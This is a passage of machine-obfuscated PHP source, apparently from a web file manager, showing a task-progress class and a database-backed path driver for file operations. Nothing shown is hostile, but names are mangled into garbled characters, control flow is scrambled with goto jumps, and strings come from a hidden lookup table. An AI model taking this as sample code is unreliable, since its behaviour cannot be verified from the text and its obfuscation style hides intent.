!1, 5); $B¾ƒù™ºØ• = strlen($fßŒ©Ô‚); break; case $E¦Ã¤å•Î¼[225]: $B¾ƒù™ºØ• = Hook::apply($a“·Šç÷ƒ[$E¦Ã¤å•Î¼[1495]]); default: break; } goto C§÷Ì×Ş÷; C®Ö»İ¢: $E¦Ã¤å•Î¼ =& $_SERVER[µ…]; self::log($E¦Ã¤å•Î¼[1492] . $a“·Šç÷ƒ[$E¦Ã¤å•Î¼[388]] . $E¦Ã¤å•Î¼[1493] . $a“·Šç÷ƒ[$E¦Ã¤å•Î¼[28]] . $E¦Ã¤å•Î¼[1494] . $a“·Šç÷ƒ[$E¦Ã¤å•Î¼[1495]]); Model($E¦Ã¤å•Î¼[1476])->run($a“·Šç÷ƒ[$E¦Ã¤å•Î¼[388]]); goto A«ğô·›é; C§÷Ì×Ş÷: Model($E¦Ã¤å•Î¼[1496])->add(array($E¦Ã¤å•Î¼[1497] => $E¦Ã¤å•Î¼[33], $E¦Ã¤å•Î¼[1498] => $E¦Ã¤å•Î¼[491], $E¦Ã¤å•Î¼[29] => $E¦Ã¤å•Î¼[1499] . $a“·Šç÷ƒ[$E¦Ã¤å•Î¼[388]], $E¦Ã¤å•Î¼[1500] => json_encode(array($E¦Ã¤å•Î¼[28] => $a“·Šç÷ƒ[$E¦Ã¤å•Î¼[28]], $E¦Ã¤å•Î¼[1501] => timeFloat() - $f’¥©±Ô, $E¦Ã¤å•Î¼[289] => $B¾ƒù™ºØ•)))); self::log($E¦Ã¤å•Î¼[1502] . $a“·Šç÷ƒ[$E¦Ã¤å•Î¼[388]] . $E¦Ã¤å•Î¼[1503] . $B¾ƒù™ºØ•); return !0; goto AìâË ‹°±; AìâË ‹°±: } private static function valueGet($bÙÒŸ¿²¹Á) { $eŞ‚àŠìµæ =& $_SERVER[µ…]; $E‚Ç¤ùËš£ = $eŞ‚àŠìµæ[1504]; $dë¶‚Çµ = Model($eŞ‚àŠìµæ[1505])->get($bÙÒŸ¿²¹Á, $E‚Ç¤ùËš£); if (is_null($dë¶‚Çµ)) { Model($eŞ‚àŠìµæ[1505])->set($eŞ‚àŠìµæ[1474], 10, $E‚Ç¤ùËš£); Model($eŞ‚àŠìµæ[1505])->set($eŞ‚àŠìµæ[704], $eŞ‚àŠìµæ[86], $E‚Ç¤ùËš£); Model($eŞ‚àŠìµæ[1505])->set($eŞ‚àŠìµæ[1469], $eŞ‚àŠìµæ[491], $E‚Ç¤ùËš£); $dë¶‚Çµ = Model($eŞ‚àŠìµæ[1505])->get($bÙÒŸ¿²¹Á, $E‚Ç¤ùËš£); } return $dë¶‚Çµ; } private static function valueSet($D‚–¶òèÕÀ, $Eµ–ƒ§îÌÄ) { $F‡‘Ÿˆ¡‡‘ =& $_SERVER[µ…]; return Model($F‡‘Ÿˆ¡‡‘[1505])->set($D‚–¶òèÕÀ, $Eµ–ƒ§îÌÄ, $F‡‘Ÿˆ¡‡‘[1504]); } protected static function log($a–î¤«£•«) { write_log($a–î¤«£•«, $_SERVER[µ…][1491]); } private static function cacheClear() { $fğÑ…±î» =& $_SERVER[µ…]; $c±­•ìÈêÏ = Model($fğÑ…±î»[1505])->cacheKey($fğÑ…±î»[1504]); Cache::clearMemory($c±­•ìÈêÏ); Model($fğÑ…±î»[1476])->cacheClear(); } } class Task { const STATYS_STOP = "\163\164\157\x70"; const STATYS_RUNNING = "\x72\165\156\156\x69\156\x67"; const STATYS_KILL = "\153\x69\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($dÈæäìİšÄ, $Fò¹«™ç„ = '', $d˜„ø¿º’Ç = 0, $e‡ƒÇ§¹Áë = '') { goto däöÂ·æ; e‡íÉµ’: $GLOBALS[$C’…§¤ó½[1512]] = 1; Hook::bind($C’…§¤ó½[1471], array($this, $C’…§¤ó½[1513])); Hook::bind($C’…§¤ó½[1514], array($this, $C’…§¤ó½[1515])); goto a¨õØËÔ¶À; a¨õØËÔ¶À: $this->startAfter(); Hook::trigger($C’…§¤ó½[1516], $this->task); $this->task[$C’…§¤ó½[1509]] = timeFloat(); goto B¨ŒÆÁœâÆ; däöÂ·æ: $C’…§¤ó½ =& $_SERVER[µ…]; if (self::get($dÈæäìİšÄ)) { return; } $this->task = array($C’…§¤ó½[388] => $dÈæäìİšÄ, $C’…§¤ó½[1506] => USER_ID, $C’…§¤ó½[1411] => $e‡ƒÇ§¹Áë, $C’…§¤ó½[29] => $Fò¹«™ç„, $C’…§¤ó½[1001] => $C’…§¤ó½[33], $C’…§¤ó½[999] => $d˜„ø¿º’Ç, $C’…§¤ó½[1013] => 0, $C’…§¤ó½[1507] => 0, $C’…§¤ó½[1508] => 0, $C’…§¤ó½[735] => timeFloat(), $C’…§¤ó½[734] => 0, $C’…§¤ó½[1509] => 0, $C’…§¤ó½[1510] => 0, $C’…§¤ó½[1511] => 0, $C’…§¤ó½[704] => $C’…§¤ó½[1469]); goto e‡íÉµ’; B¨ŒÆÁœâÆ: } public function end() { goto B—‰ßŞµ¯; dŠ‹¾§©·á: $E¾ó«“äé¤ = timeFloat() - $this->task[$Bİ„ŒÉùÉ‹[735]]; self::log($Bİ„ŒÉùÉ‹[1517] . $this->task[$Bİ„ŒÉùÉ‹[388]] . $Bİ„ŒÉùÉ‹[1518] . $E¾ó«“äé¤ . $Bİ„ŒÉùÉ‹[1519]); Hook::unbind($Bİ„ŒÉùÉ‹[1471], array($this, $Bİ„ŒÉùÉ‹[1513])); goto F÷‚†îï¥‰; F÷‚†îï¥‰: Hook::unbind($Bİ„ŒÉùÉ‹[1514], array($this, $Bİ„ŒÉùÉ‹[1515])); $this->endAfter(); $this->task = !1; goto fİïÁÜ²íî; B—‰ßŞµ¯: $Bİ„ŒÉùÉ‹ =& $_SERVER[µ…]; if (!$this->task) { return; } if ($this->task[$Bİ„ŒÉùÉ‹[1509]]) { self::valueSet($this->task[$Bİ„ŒÉùÉ‹[388]], !1); } goto dŠ‹¾§©·á; fİïÁÜ²íî: } public function update($f‘…öê­ˆ– = 0, $c›Úê‚Ì‰´ = false) { goto A·é¥¨Š¼Ê; E¦îÀê”è: $this->updateAfter(); $FÆ«”ÓÖ¸« = 0.2; if (timeFloat() - $DóƒÉÏì[$DøÊ±›·² [1509]] < $FÆ«”ÓÖ¸« && !$c›Úê‚Ì‰´) { return; } goto b¡Ù­ôÏ¹é; b¡Ù­ôÏ¹é: $BÙ¨Í‘‡ÌŞ = self::get($DóƒÉÏì[$DøÊ±›·² [388]]); $b«‚¸ŞŒ¡ = $BÙ¨Í‘‡ÌŞ[$DøÊ±›·² [704]]; if ($b«‚¸ŞŒ¡ == self::STATYS_KILL) { $E³ËøÜÑ©Â = array($DøÊ±›·² [1520] => LNG($DøÊ±›·² [1521]), $DøÊ±›·² [1063] => !1); Cache::set($DøÊ±›·² [1522] . $this->task[$DøÊ±›·² [388]], $E³ËøÜÑ©Â, 30); $this->end(); die; } else { if ($b«‚¸ŞŒ¡ == self::STATYS_STOP) { $A…×ÖÃ–áô = 2; $BÙ¨Í‘‡ÌŞ[$DøÊ±›·² [1510]] += $A…×ÖÃ–áô; self::valueSet($DóƒÉÏì[$DøÊ±›·² [388]], $BÙ¨Í‘‡ÌŞ); sleep($A…×ÖÃ–áô); $this->update(); return; } } goto Eè‘âÑÆ; A·é¥¨Š¼Ê: $DøÊ±›·²  =& $_SERVER[µ…]; $DóƒÉÏì =& $this->task; if (!$DóƒÉÏì) { return; } goto eìõ½œµ; eìõ½œµ: $DóƒÉÏì[$DøÊ±›·² [1013]] += $f‘…öê­ˆ–; $DóƒÉÏì[$DøÊ±›·² [734]] = timeFloat(); if ($DóƒÉÏì[$DøÊ±›·² [999]]) { if ($DóƒÉÏì[$DøÊ±›·² [999]] < $DóƒÉÏì[$DøÊ±›·² [1013]]) { $DóƒÉÏì[$DøÊ±›·² [999]] = $DóƒÉÏì[$DøÊ±›·² [1013]]; } $cÇÒ£³İÙ = timeFloat() - $DóƒÉÏì[$DøÊ±›·² [735]] - $DóƒÉÏì[$DøÊ±›·² [1510]]; $DóƒÉÏì[$DøÊ±›·² [1507]] = $DóƒÉÏì[$DøÊ±›·² [1013]] / $DóƒÉÏì[$DøÊ±›·² [999]]; $DóƒÉÏì[$DøÊ±›·² [1508]] = $DóƒÉÏì[$DøÊ±›·² [1013]] / $cÇÒ£³İÙ; if ($DóƒÉÏì[$DøÊ±›·² [1507]] > 0) { $DóƒÉÏì[$DøÊ±›·² [1511]] = $cÇÒ£³İÙ * (1 - $DóƒÉÏì[$DøÊ±›·² [1507]]) / $DóƒÉÏì[$DøÊ±›·² [1507]]; } $DóƒÉÏì[$DøÊ±›·² [1511]] = $DóƒÉÏì[$DøÊ±›·² [1511]] <= 0 ? 0 : $DóƒÉÏì[$DøÊ±›·² [1511]]; } goto E¦îÀê”è; Eè‘âÑÆ: $DóƒÉÏì[$DøÊ±›·² [704]] = $b«‚¸ŞŒ¡ ? $b«‚¸ŞŒ¡ : $DóƒÉÏì[$DøÊ±›·² [704]]; $DóƒÉÏì[$DøÊ±›·² [1510]] = $BÙ¨Í‘‡ÌŞ[$DøÊ±›·² [1510]] ? $BÙ¨Í‘‡ÌŞ[$DøÊ±›·² [1510]] : 0; $DóƒÉÏì[$DøÊ±›·² [1509]] = timeFloat(); goto A‰Ò¿’¦…¨; A‰Ò¿’¦…¨: Hook::trigger($DøÊ±›·² [1523], $DóƒÉÏì); self::valueSet($DóƒÉÏì[$DøÊ±›·² [388]], $DóƒÉÏì); goto E÷í‰Â±; E÷í‰Â±: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Fµèî£İ¥¨) { $C×ë¨è’„ø =& $_SERVER[µ…]; Cache::set($C×ë¨è’„ø[1522] . $this->task[$C×ë¨è’„ø[388]], $Fµèî£İ¥¨, 60); return $Fµèî£İ¥¨; } public static function get($f¢‹ØÄ‚ê) { return self::valueGet($f¢‹ØÄ‚ê); } public static function listData() { $Bõ¸ëƒî = self::valueGet(); return array_sort_by($Bõ¸ëƒî, $_SERVER[µ…][735], !0); } public static function kill($døÃÅ“¨‚Ä) { return self::changeStatus($døÃÅ“¨‚Ä, self::STATYS_KILL); } public static function stop($c´Áç±ƒ¸‘) { return self::changeStatus($c´Áç±ƒ¸‘, self::STATYS_STOP); } public static function restart($cë¾‰¯ÀÓŞ) { return self::changeStatus($cë¾‰¯ÀÓŞ, self::STATYS_RUNNING); } public static function killAll() { $D‘ÜÈ Ú®å =& $_SERVER[µ…]; $CÁå…ÚƒĞ´ = self::listData(); foreach ($CÁå…ÚƒĞ´ as $e„­Ï”ä²Ø) { self::kill($e„­Ï”ä²Ø[$D‘ÜÈ Ú®å[388]]); } sleep(2); foreach ($CÁå…ÚƒĞ´ as $e„­Ï”ä²Ø) { self::valueSet($e„­Ï”ä²Ø[$D‘ÜÈ Ú®å[388]], !1); } } private static function changeStatus($bŸ÷ö§øˆ², $Aë½¿–µ²²) { goto E»›àíèÙò; E»›àíèÙò: $e‚ªçğÍ® =& $_SERVER[µ…]; $e»ÈÛ†…» = self::valueGet($bŸ÷ö§øˆ²); if (!$e»ÈÛ†…») { return !1; } goto f³·í¯ô¿í; f³·í¯ô¿í: $e»ÈÛ†…»[$e‚ªçğÍ®[704]] = $Aë½¿–µ²²; self::valueSet($bŸ÷ö§øˆ², $e»ÈÛ†…»); self::log($e‚ªçğÍ®[1524] . $e»ÈÛ†…»[$e‚ªçğÍ®[388]] . $e‚ªçğÍ®[1525] . $Aë½¿–µ²²); goto Eä×ŠÓĞ¼¯; Eä×ŠÓĞ¼¯: return !0; goto DŒÙ„‹ğºÓ; DŒÙ„‹ğºÓ: } public static function valueGet($Fö‚à¦‚…¾ = false) { $eš»‹ô¼åó =& $_SERVER[µ…]; if ($Fö‚à¦‚…¾) { $cÁÅ¦ÁùĞ¤ = Model($eš»‹ô¼åó[419])->where(array($eš»‹ô¼åó[92] => $Fö‚à¦‚…¾, $eš»‹ô¼åó[29] => $eš»‹ô¼åó[1526]))->find(); return $cÁÅ¦ÁùĞ¤ ? json_decode($cÁÅ¦ÁùĞ¤[$eš»‹ô¼åó[370]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($eÇÑ£ùëó = false) { goto a‹ì“ÉØ½Ù; eÉ…äñáÔ: $d¦ùØ†Šƒ¼ = Model($e¡½ê¾âÎä[419])->where($AÊÅíĞÈ¥)->select(); $d¦ùØ†Šƒ¼ = $d¦ùØ†Šƒ¼ ? $d¦ùØ†Šƒ¼ : array(); foreach ($d¦ùØ†Šƒ¼ as $fÀØƒóãÈì => $FŸ‘²Ÿ±) { $d¦ùØ†Šƒ¼[$fÀØƒóãÈì] = json_decode($FŸ‘²Ÿ±[$e¡½ê¾âÎä[370]], !0); } goto bñé‚ò; a‹ì“ÉØ½Ù: $e¡½ê¾âÎä =& $_SERVER[µ…]; $AÊÅíĞÈ¥ = array($e¡½ê¾âÎä[29] => $e¡½ê¾âÎä[1526]); if ($eÇÑ£ùëó) { $AÊÅíĞÈ¥[$e¡½ê¾âÎä[1506]] = $eÇÑ£ùëó; } goto eÉ…äñáÔ; bñé‚ò: return $d¦ùØ†Šƒ¼; goto f¢§²ğÂ¿; f¢§²ğÂ¿: } public static function valueSet($FîğÑÄ‘¡‹, $BãÌ¢¢ÚŸÛ) { goto EƒËËÑŸ¹Û; F®«Œƒµ·Ç: if (!$c ·È½³æ÷) { ob_start(); var_dump($BãÌ¢¢ÚŸÛ); $CŒä åä÷‡ = ob_get_clean(); self::log($Dƒİ´¨Ø³™[1527] . json_encode_force($CŒä åä÷‡)); } if (!$FîğÑÄ‘¡‹ || !$BãÌ¢¢ÚŸÛ[$Dƒİ´¨Ø³™[388]]) { return !1; } $b»²Ã“ÔºÌ = array($Dƒİ´¨Ø³™[29] => $Dƒİ´¨Ø³™[1526], $Dƒİ´¨Ø³™[1506] => USER_ID, $Dƒİ´¨Ø³™[92] => $FîğÑÄ‘¡‹, $Dƒİ´¨Ø³™[370] => $c ·È½³æ÷); goto f†—Ç‹ëÄ˜; EƒËËÑŸ¹Û: $Dƒİ´¨Ø³™ =& $_SERVER[µ…]; if (!$BãÌ¢¢ÚŸÛ) { return Model($Dƒİ´¨Ø³™[419])->where(array($Dƒİ´¨Ø³™[92] => $FîğÑÄ‘¡‹, $Dƒİ´¨Ø³™[29] => $Dƒİ´¨Ø³™[1526]))->delete(); } $c ·È½³æ÷ = json_encode($BãÌ¢¢ÚŸÛ); goto F®«Œƒµ·Ç; f†—Ç‹ëÄ˜: Model($Dƒİ´¨Ø³™[419])->add($b»²Ã“ÔºÌ, array(), !0); goto aÆ‰Çµİ©; aÆ‰Çµİ©: } public static function log($E›‚…ºíÁ¯) { write_log($E›‚…ºíÁ¯, $_SERVER[µ…][1528]); } } goto FÕ¨ŠŒ†Şİ; Cˆˆ“åÉ›: define($_SERVER[µ…][235], 2); define($_SERVER[µ…][236], 3); define($_SERVER[µ…][237], 1); goto b©÷Ç°½÷ß; A’‚ÓÌ¯¹: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($C¯¦Ğ¿ô) { $this->pathParse = $C¯¦Ğ¿ô; $this->model = Model($_SERVER[µ…][1181]); } public function getPath($e˜Ó¢Ø±¶Ã) { return trim($e˜Ó¢Ø±¶Ã, $_SERVER[µ…][8]); } public function pathFather($e½Úï†–…ƒ) { $dêƒÁ–‡·Û = $this->parse($e½Úï†–…ƒ); $dêƒÁ–‡·Û = $this->infoSimple($e½Úï†–…ƒ); return $dêƒÁ–‡·Û ? $dêƒÁ–‡·Û[$_SERVER[µ…][472]] : !1; } public function pathThis($aœ½‘õ«éÜ) { $f§±’ìå¾Ÿ = $this->infoSimple($aœ½‘õ«éÜ); return $f§±’ìå¾Ÿ ? $f§±’ìå¾Ÿ[$_SERVER[µ…][28]] : !1; } public function getPathOuter($aëÄô¥Œ¸†) { if (!$aëÄô¥Œ¸†) { return $aëÄô¥Œ¸†; } $B…ªÙÙ‡Ä¿ = $this->parse($aëÄô¥Œ¸†); return KodIO::make($B…ªÙÙ‡Ä¿[$_SERVER[µ…][388]]); } public function copyFolderFromIO($d¡…ô“°‹ƒ, $E™«™¼Š, $eˆÑñîù±ğ, $F´¶Ô‹¾ñ, $Dˆ›‘ÎÍØ) { $CÆçÔÒ®¨½ = $this->model->copyFolderFromIO($d¡…ô“°‹ƒ, $E™«™¼Š, $eˆÑñîù±ğ, $F´¶Ô‹¾ñ, $Dˆ›‘ÎÍØ); return KodIO::make($CÆçÔÒ®¨½); } public function isParentOf($eÆöĞé¾, $eĞË‹™˜Ï°) { return $this->model->isParentOf($eÆöĞé¾, $eĞË‹™˜Ï°); } public function mkfile($f‡™‚î§‡‚, $fÈ˜ ¶Šç = '', $EÙ‡ê¤å„‹ = REPEAT_RENAME) { $B‰‹æîå”ê =& $_SERVER[µ…]; $fÃÕáÄêº— = $this->parse($f‡™‚î§‡‚); $f‡™‚î§‡‚ = $fÃÕáÄêº—[$B‰‹æîå”ê[388]]; for ($bñğ»Ì’²† = 0; $bñğ»Ì’²† < count($fÃÕáÄêº—[$B‰‹æîå”ê[1182]]); $bñğ»Ì’²†++) { $a„Á…Æª’À = $fÃÕáÄêº—[$B‰‹æîå”ê[1182]][$bñğ»Ì’²†]; if ($bñğ»Ì’²† == count($fÃÕáÄêº—[$B‰‹æîå”ê[1182]]) - 1) { $f‡™‚î§‡‚ = $this->model->mkfile($f‡™‚î§‡‚, $a„Á…Æª’À, $fÈ˜ ¶Šç, $EÙ‡ê¤å„‹); break; } $f‡™‚î§‡‚ = $this->model->mkdir($f‡™‚î§‡‚, $a„Á…Æª’À, REPEAT_SKIP); } return $this->getPathOuter($f‡™‚î§‡‚); } public function mkdir($CæÕÀöĞÀÂ, $bœãä–œĞ = REPEAT_SKIP) { $e©Á…›Î»¡ =& $_SERVER[µ…]; $D÷‘¹Ïª¯— = $this->parse($CæÕÀöĞÀÂ); $CæÕÀöĞÀÂ = $D÷‘¹Ïª¯—[$e©Á…›Î»¡[388]]; for ($fŒ¦Ú‘ê = 0; $fŒ¦Ú‘ê < count($D÷‘¹Ïª¯—[$e©Á…›Î»¡[1182]]); $fŒ¦Ú‘ê++) { $AÛ ¿èÁ¯ = $D÷‘¹Ïª¯—[$e©Á…›Î»¡[1182]][$fŒ¦Ú‘ê]; $CæÕÀöĞÀÂ = $this->model->mkdir($CæÕÀöĞÀÂ, $AÛ ¿èÁ¯, $bœãä–œĞ); } return $this->getPathOuter($CæÕÀöĞÀÂ); } public function copyFile($Fììº‹ƒ›æ, $c§‡ƒÊ²ø, $EçŞ¿¬ç„ = REPEAT_REPLACE) { $CªïÎŠ’ù• =& $_SERVER[µ…]; $e•öÅÊ¬¨Â = $this->parse($c§‡ƒÊ²ø); $e¯Ú İÜÍ„ = $this->model->copy($Fììº‹ƒ›æ, $e•öÅÊ¬¨Â[$CªïÎŠ’ù•[388]], $EçŞ¿¬ç„, $e•öÅÊ¬¨Â[$CªïÎŠ’ù•[75]]); return $e¯Ú İÜÍ„ ? $this->getPathOuter($e¯Ú İÜÍ„) : !1; } public function moveFile($D‰…‰­Ÿé, $AºïÖ®Ù–Â, $fæ ÑÎœá = REPEAT_REPLACE) { $e‹¤¢²Ú–× =& $_SERVER[µ…]; $aÏù­Œ­á³ = $this->parse($AºïÖ®Ù–Â); $eõŞ÷¬ª£ = $this->model->move($D‰…‰­Ÿé, $aÏù­Œ­á³[$e‹¤¢²Ú–×[388]], $fæ ÑÎœá, $aÏù­Œ­á³[$e‹¤¢²Ú–×[75]]); return $eõŞ÷¬ª£ ? $this->getPathOuter($eõŞ÷¬ª£) : !1; } public function copy($C™Ì”¡‰º, $c±Ç•§«¤», $cçÍÊøÄ„¼ = REPEAT_REPLACE) { $eõª‚à…æ = $this->parse($c±Ç•§«¤»); $cö‚ˆÚÈá = $this->model->copy($C™Ì”¡‰º, $eõª‚à…æ[$_SERVER[µ…][388]], $cçÍÊøÄ„¼); return $cö‚ˆÚÈá ? $this->getPathOuter($cö‚ˆÚÈá) : !1; } public function moveSameAllow() { } public function move($dè–ñ²¡Ş, $dÃå¼œ ¢É, $AÖ®ˆñà–ª = REPEAT_REPLACE) { $aÈ®Æè¡Ş = $this->parse($dÃå¼œ ¢É); $A÷Î¶æÅùß = $this->model->move($dè–ñ²¡Ş, $aÈ®Æè¡Ş[$_SERVER[µ…][388]], $AÖ®ˆñà–ª); return $A÷Î¶æÅùß ? $this->getPathOuter($A÷Î¶æÅùß) : !1; } public function remove($d‡é¢‚äÙÒ, $f‹Ä…¢‘Å„ = true) { return $this->model->remove($d‡é¢‚äÙÒ, $f‹Ä…¢‘Å„); } public function rename($eœŠ¸Ó±›, $dÕ˜åĞ‘„) { $Fƒ²õÑ­—ª = $this->model->rename($eœŠ¸Ó±›, $dÕ˜åĞ‘„); return $Fƒ²õÑ­—ª ? $this->getPathOuter($eœŠ¸Ó±›) : $Fƒ²õÑ­—ª; } public function size($b›†ÖÏ“£å) { $a”Ò íò„ = $this->infoSimple($b›†ÖÏ“£å); return $a”Ò íò„ ? $a”Ò íò„[$_SERVER[µ…][77]] : 0; } public function infoSimple($fƒ–¡†¥Üµ) { return $this->model->sourceInfo($fƒ–¡†¥Üµ); } public function info($Dô¡¡õ²…) { return $this->infoParse($Dô¡¡õ²…); } public function infoAuth($DÇÚ¸¥Åöô) { return $this->infoParse($DÇÚ¸¥Åöô, !1, !0); } public function infoWithChildren($FíÑµ †š) { return $this->infoParse($FíÑµ †š, !0); } protected function infoParse($DÈ×¹Û³Ğ‚, $f¹±¯À…ù© = false, $C½áÀâ†âˆ = false) { if (!$f¹±¯À…ù©) { return $this->model->pathInfo($DÈ×¹Û³Ğ‚, $C½áÀâ†âˆ); } return $this->model->pathInfoMore($DÈ×¹Û³Ğ‚); } public function infoFull($aîÊ¿øŒ) { $d¥ß¹ôºÍ =& $_SERVER[µ…]; $Dß†ĞÙ£ = explode($d¥ß¹ôºÍ[8], $aîÊ¿øŒ); $b…³Ä³ = implode($d¥ß¹ôºÍ[8], array_splice($Dß†ĞÙ£, 1)); return $this->model->pathInfoByPath($Dß†ĞÙ£[0], $b…³Ä³); } public function hashSimple($Dİ ´×¡Úˆ) { $Eéœ¨­ï¤ó =& $_SERVER[µ…]; $E»ãÄ÷’É = $this->infoWithChildren($Dİ ´×¡Úˆ); return $E»ãÄ÷’É[$Eéœ¨­ï¤ó[163]][$Eéœ¨­ï¤ó[170]]; } public function hashMd5($Fì£à«ô‰î) { $A«Ÿ›áä— =& $_SERVER[µ…]; $b¥İÌ¢°Ş = $this->infoWithChildren($Fì£à«ô‰î); return $b¥İÌ¢°Ş[$A«Ÿ›áä—[163]][$A«Ÿ›áä—[169]]; } public function exist($C¼ÀÇßÃìÃ) { $dÇÙË´Ï’¯ =& $_SERVER[µ…]; $D…£ Í†º = $this->parse($C¼ÀÇßÃìÃ); if (!$D…£ Í†º[$dÇÙË´Ï’¯[75]]) { return $this->isFile($C¼ÀÇßÃìÃ) || $this->isFolder($C¼ÀÇßÃìÃ); } $d†Õ¦‡Ó†¾ = array($dÇÙË´Ï’¯[389] => $D…£ Í†º[$dÇÙË´Ï’¯[388]], $dÇÙË´Ï’¯[28] => $D…£ Í†º[$dÇÙË´Ï’¯[75]]); $Fª¯ĞÀ‘¥¾ = $this->model->where($d†Õ¦‡Ó†¾)->find(); return $Fª¯ĞÀ‘¥¾ ? !0 : !1; } public function isFile($d‡É “¯ôù) { $eã÷Å©—Ú =& $_SERVER[µ…]; $A¦¿¬Ï‡Ìó = $this->infoSimple($d‡É “¯ôù); return $A¦¿¬Ï‡Ìó && $A¦¿¬Ï‡Ìó[$eã÷Å©—Ú[397]] == $eã÷Å©—Ú[86] ? !1 : !0; } public function isFolder($a¤äÍ¢è¥î) { $e¼ÈÅÃ©ÕÜ =& $_SERVER[µ…]; $E—¹¯‹‡Ñ® = $this->infoSimple($a¤äÍ¢è¥î); return $E—¹¯‹‡Ñ® && $E—¹¯‹‡Ñ®[$e¼ÈÅÃ©ÕÜ[397]] == $e¼ÈÅÃ©ÕÜ[86] ? !0 : !1; } public function listPath($bÁˆ·ÔßÏõ, $bèŒ¶°¡ = false) { $cÄ¦–‡Ì¸Ş =& $_SERVER[µ…]; if ($bÁˆ·ÔßÏõ == $cÄ¦–‡Ì¸Ş[33]) { return !1; } $cÔ¶ƒÃÓ™ß = array($cÄ¦–‡Ì¸Ş[389] => $bÁˆ·ÔßÏõ); if ($bèŒ¶°¡) { return $this->model->listSource($cÔ¶ƒÃÓ™ß, -1); } return $this->model->listSource($cÔ¶ƒÃÓ™ß); } public function has($e›ÌŠˆƒÖê, $EØ¿í¥¡œè = false, $dÂøÉ½Œ = null) { $F°¤É·’ =& $_SERVER[µ…]; $c¥»åƒ¤ = $this->infoWithChildren($e›ÌŠˆƒÖê); if ($EØ¿í¥¡œè) { return array($F°¤É·’[202] => $c¥»åƒ¤[$F°¤É·’[202]], $F°¤É·’[201] => $c¥»åƒ¤[$F°¤É·’[201]]); } return $dÂøÉ½Œ ? $c¥»åƒ¤[$F°¤É·’[202]] : $c¥»åƒ¤[$F°¤É·’[201]]; } public function listAll($b‰«óÓ‹Ã²) { $A¯Î¾¯ƒÁ = IO::info($this->pathParse[$_SERVER[µ…][75]]); if (!$A¯Î¾¯ƒÁ) { return array(); } return $this->model->listAll($b‰«óÓ‹Ã²); } public function getContent($e¹ÃîÀ­é†) { return $this->model->getContent($e¹ÃîÀ­é†); } public function setContent($Bßæ§©˜º°, $dÑˆ®—â‹¥ = '') { return $this->model->setContent($Bßæ§©˜º°, $dÑˆ®—â‹¥); } public function fileSubstr($d‘Â±‡›, $e”õ˜Ù‚§„, $c­œ¥°Òãî) { return $this->model->fileSubstr($d‘Â±‡›, $e”õ˜Ù‚§„, $c­œ¥°Òãî); } public function download($a»ŒîïÏ§ô, $A»Š‘˜ÉÁ› = '') { $céÍù®Ş³ = get_path_father($A»Š‘˜ÉÁ›); $Dš‰ñ³ôÈˆ = get_path_this($A»Š‘˜ÉÁ›); $B“¸‚™Â = $this->model->fileInfoGet($a»ŒîïÏ§ô); $DŒ½¬ºŒ  = IO::copy($B“¸‚™Â[$_SERVER[µ…][75]], $céÍù®Ş³, !1, $Dš‰ñ³ôÈˆ); return $DŒ½¬ºŒ ; } public function setModifyTime($F§áí¶Û¨‚, $eªí•Æ×£ = '') { $this->model->metaSet($F§áí¶Û¨‚, $_SERVER[µ…][1183], $eªí•Æ×£); } public function upload($Bù¾—‘ä…¾, $C¨îÄ÷Ñ³Å, $f™Œ·çÛâ = false, $AŞëî‚×Ìó = REPEAT_REPLACE) { $E¨½–’‰¨µ =& $_SERVER[µ…]; $dø„Í×¦£å = $this->parse($Bù¾—‘ä…¾); $d¹§Ş¨—ºŠ = $this->model->addFile($dø„Í×¦£å[$E¨½–’‰¨µ[388]], $C¨îÄ÷Ñ³Å, $dø„Í×¦£å[$E¨½–’‰¨µ[75]], $f™Œ·çÛâ, $AŞëî‚×Ìó); return $this->getPathOuter($d¹§Ş¨—ºŠ); } public function uploadFileByID($E·Ë‡„Õ, $EÇ’ÄĞè·, $bäœ±© Šª) { $E™Á„ï÷ç =& $_SERVER[µ…]; $bËª×ùô‰ù = $this->parse($E·Ë‡„Õ); $a¤­±¿äí = $this->model->addFileByFileID($bËª×ùô‰ù[$E™Á„ï÷ç[388]], $EÇ’ÄĞè·, $bËª×ùô‰ù[$E™Á„ï÷ç[75]], $bäœ±© Šª); return $this->getPathOuter($a¤­±¿äí); } public function addFileByRemote($Dê¯Û¨Õ»¦, $a±ÎÖÚ®¶á, $bãèãã¡À„ = array(), $b‘öš´ó³Å = '', $D§ï…ÅÔøí) { $b·¢ù†Ğçî =& $_SERVER[µ…]; $d…ÇÎë™¦ô = $this->parse($Dê¯Û¨Õ»¦); $b‘öš´ó³Å = empty($b‘öš´ó³Å) ? $d…ÇÎë™¦ô[$b·¢ù†Ğçî[75]] : $b‘öš´ó³Å; $Aè¤ƒËò‘ = $this->model->addFileByRemote($d…ÇÎë™¦ô[$b·¢ù†Ğçî[388]], $a±ÎÖÚ®¶á, $b‘öš´ó³Å, $bãèãã¡À„, $D§ï…ÅÔøí); return $this->getPathOuter($Aè¤ƒËò‘); } public function uploadLink($eœÉô‰´ÑÂ, $dÌ•£‹„è· = 0) { $e ­¹íòŒï =& $_SERVER[µ…]; $aØùËòõ = $this->parse($eœÉô‰´ÑÂ); $fñåõ¶í£ = _get($GLOBALS[$e ­¹íòŒï[7]], $e ­¹íòŒï[1184]); $AÀøÄÂ…øî = _get($GLOBALS[$e ­¹íòŒï[7]], $e ­¹íòŒï[1185]); $eœÉô‰´ÑÂ = Model($e ­¹íòŒï[566])->createFileName($aØùËòõ[$e ­¹íòŒï[75]], $fñåõ¶í£, $AÀøÄÂ…øî); return IO::uploadLink($eœÉô‰´ÑÂ, $dÌ•£‹„è·); } public function fileNameAuto($c¡ÍŒ™„·Á, $bñÁ°§ÇÙ, $f©àŸ˜Ç = REPEAT_REPLACE, $EîñˆÔè¯Ö = false) { return $this->model->fileNameAuto($c¡ÍŒ™„·Á, $bñÁ°§ÇÙ, $f©àŸ˜Ç, $EîñˆÔè¯Ö); } public function fileNameExist($CÁîìãš‡, $CØáµï·¬¹) { return $this->model->fileNameExist($CÁîìãš‡, $CØáµï·¬¹); } protected function _fileOut($Fœ™±ª¾Ö, $C˜æ¶Ÿ„õò = false, $Fá—Îãšç = false, $bç‚Å‰Û®¡ = '', $aØÀ½á÷ = false) { goto EÜ±ƒìÒá; bëï–Êçëº: $d˜Å¾ù—© = $this->model->fileInfoGet($Fœ™±ª¾Ö); $bç‚Å‰Û®¡ = 